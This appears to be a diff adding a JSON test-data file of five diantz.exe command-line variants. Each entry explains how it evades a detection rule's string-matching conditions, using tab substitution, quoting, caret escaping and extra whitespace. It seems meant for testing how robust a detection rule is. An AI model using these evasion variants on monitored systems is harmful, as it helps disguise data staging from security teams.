@@ -1,0 +1,22 @@
+[
+  {
+    "output": "diantz.exe\t\\\\UNC\\share\\file.txt C:\\Temp\\output.cab",
+    "explanation": "Substitution technique: Replacing the required structural single leading space before the UNC path component (' \\\\') with a horizontal tab character ('\\t'). The Windows kernel natively handles horizontal tabs as valid parameter whitespace separators during process creation tokenization, satisfying target binary parsing while cleanly breaking the space-padded literal check constraint."
+  },
+  {
+    "output": "diantz.exe \"\\\\UNC\\share\\file.txt\" C:\\Temp\\output.cab",
+    "explanation": "Insertion technique: Enclosing the remote UNC file target path inside explicit double quotes. This alters the raw command-line text character sequence layout from an unquoted space-backslash format into an isolated quoted boundary structure (' \"\\\\'). This successfully bypasses the strict sequential check for ' \\\\' while the operating system strips the quotes during token initialization."
+  },
+  {
+    "output": "cmd.exe /c dian^tz.exe \\\\UNC\\share\\file.txt C:\\Temp\\output.cab",
+    "explanation": "Insertion technique: Routing execution through a cmd.exe environment context to inject a command shell caret escape character ('^') directly into the binary file string token ('dian^tz.exe'). The parent command interpreter consumes and drops this modifier prior to process creation initialization, leaving a recorded event log sequence that completely subverts the condition requiring the literal text pattern 'diantz.exe'."
+  },
+  {
+    "output": "diantz.exe  \\\\UNC\\share\\file.txt  C:\\Temp\\output.cab",
+    "explanation": "Insertion technique: Injecting multiple consecutive spaces before the remote path parameter string ('  \\\\'). While the operating system normalizes and collapses duplicate whitespaces into discrete token pointers at initialization, strict positional or single-space padded signature checkers (such as ' \\\\') will fail to trigger."
+  },
+  {
+    "output": "diantz.exe \\\\UNC\\share\\file.txt C:\\Temp\\output.cab ",
+    "explanation": "Insertion technique: Appending a trailing space character to the absolute end of the command line string. While this variation still retains the required substring sequences evaluated by the rule's 'contains|all' conditional clause, shifting whitespace balances across non-anchored tokens safely tests for fragile character alignment assumptions in advanced custom sub-parsers."
+  }
+]
